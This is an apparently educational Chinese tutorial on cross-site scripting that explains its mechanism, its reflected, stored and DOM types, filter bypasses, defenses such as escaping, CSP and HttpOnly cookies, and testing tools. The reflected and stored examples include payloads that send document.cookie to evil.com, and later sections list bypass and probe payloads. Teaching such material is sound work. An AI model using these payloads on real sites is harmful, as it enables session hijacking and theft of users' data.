---
order: 50
title: XSS攻击
module: cybersecurity
category: 'eng-infra'
difficulty: intermediate
description: 跨站脚本攻击原理、分类、利用方式与防御策略详解。
author: fanquanpp
updated: '2026-06-14'
related:
  - cybersecurity/二进制安全与应急响应
  - cybersecurity/安全工具与实战
  - cybersecurity/安全模型与框架
  - cybersecurity/CSRF攻击
prerequisites:
  - cybersecurity/安全基础与防御
---

## 1. XSS 攻击原理

### 1.1 什么是 XSS

跨站脚本攻击（Cross-Site Scripting, XSS）是一种将恶意脚本注入到受信任网站中的攻击方式。攻击者利用 Web 应用对用户输入缺乏充分过滤/转义的漏洞，使恶意代码在其他用户的浏览器中执行。

### 1.2 攻击流程

```
1. 攻击者发现输入点 → 注入恶意脚本
2. 服务器未过滤 → 存储或反射恶意内容
3. 受害者访问页面 → 浏览器执行恶意脚本
4. 脚本窃取 Cookie/Session/敏感信息 → 发送到攻击者服务器
```

### 1.3 危害

| 危害类型    | 描述                                     |
| ----------- | ---------------------------------------- |
| Cookie 窃取 | 窃取用户 Session，实现会话劫持           |
| 键盘记录    | 记录用户输入的密码等敏感信息             |
| 钓鱼攻击    | 伪造登录表单骗取凭证                     |
| 网页篡改    | 修改页面内容，破坏品牌形象               |
| 蠕虫传播    | 自动发送含恶意代码的消息（如 Samy 蠕虫） |
| 挖矿劫持    | 在用户浏览器中运行加密货币挖矿脚本       |

## 2. XSS 分类

### 2.1 反射型 XSS（非持久型）

恶意脚本通过 URL 参数传递，服务器将其"反射"回响应页面。

**攻击示例**：

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**特点**：

- 一次性触发，需诱骗用户点击恶意链接
- 不存储在服务器端
- 常见于搜索、错误提示等页面

### 2.2 存储型 XSS（持久型）

恶意脚本被永久存储在服务器（数据库、文件等），每次访问都会执行。

**攻击示例**：

```html
<!-- 在评论区提交 -->
<div class="comment">
  <script>
    fetch('https://evil.com/steal?c=' + document.cookie);
  </script>
</div>
```

**特点**：

- 持久化存储，影响范围广
- 无需诱骗点击，用户正常浏览即可触发
- 危害最大，常见于评论、留言、用户资料

### 2.3 DOM 型 XSS

恶意脚本通过修改 DOM 环境触发，完全在客户端完成，不经过服务器。

**漏洞代码**：

```javascript
// 从 URL 提取内容直接写入 DOM
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

**攻击 URL**：

```
https://example.com/page?name=<img src=x onerror=alert(1)>
```

**特点**：

- 客户端漏洞，服务器日志无法记录
- WAF 难以检测
- 常见于 SPA 应用

## 3. XSS 绕过技术

### 3.1 基本绕过

| 过滤方式        | 绕过方法                                         |
| --------------- | ------------------------------------------------ |
| `<script>` 过滤 | `<img onerror>`、`<svg onload>`                  |
| 关键字大小写    | `<ScRiPt>`                                       |
| 空格/换行       | `<scr\nipt>`                                     |
| 编码绕过        | HTML 实体 `&#x3c;script&#x3e;`、Unicode `\u003c` |
| 双重编码        | `%253cscript%253e`                               |

### 3.2 高级绕过

```javascript
// 事件处理器
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

// JavaScript 伪协议
<a href="javascript:alert(1)">click</a>

// SVG 标签
<svg><script>alert&#40;1&#41;</script></svg>

// 模板字面量
<script>alert`1`</script>
```

## 4. XSS 防御策略

### 4.1 输入过滤与输出转义

**HTML 转义**：

```javascript
function escapeHtml(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
  return str.replace(/[&<>"']/g, (c) => map[c]);
}
```

**不同上下文的转义**：

| 上下文     | 转义方式               |
| ---------- | ---------------------- |
| HTML 内容  | `&lt;` `&gt;` `&amp;`  |
| HTML 属性  | `&quot;` `&#x27;`      |
| JavaScript | Unicode 编码 `\uXXXX`  |
| URL        | `encodeURIComponent()` |
| CSS        | CSS 转义 `\XXXXXX`     |

### 4.2 内容安全策略（CSP）

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'
```

**CSP 关键指令**：

| 指令               | 作用               |
| ------------------ | ------------------ |
| `script-src`       | 控制脚本来源       |
| `style-src`        | 控制样式来源       |
| `img-src`          | 控制图片来源       |
| `default-src`      | 默认策略           |
| `nonce-`           | 基于随机数的白名单 |
| `'strict-dynamic'` | 信任动态加载的脚本 |

### 4.3 HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：JavaScript 无法读取 Cookie
- `Secure`：仅 HTTPS 传输
- `SameSite`：防止跨站请求携带 Cookie

### 4.4 现代框架防护

| 框架    | 防护机制                                           |
| ------- | -------------------------------------------------- |
| React   | JSX 自动转义，`dangerouslySetInnerHTML` 需显式使用 |
| Vue     | 模板自动转义，`v-html` 需显式使用                  |
| Angular | 默认转义，`DomSanitizer` 处理信任内容              |

## 5. XSS 检测与测试

### 5.1 自动化工具

| 工具       | 类型       | 特点            |
| ---------- | ---------- | --------------- |
| OWASP ZAP  | 代理扫描   | 开源、功能全面  |
| Burp Suite | 代理扫描   | 专业版功能强大  |
| XSSer      | 专用工具   | 自动化 XSS 检测 |
| Arachni    | Web 扫描器 | 支持 DOM XSS    |

### 5.2 手动测试 Payload

```
// 基础探测
<script>alert('XSS')</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

// 事件处理器
" onmouseover="alert(1)
' onfocus=alert(1) autofocus='

// 编码绕过
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```
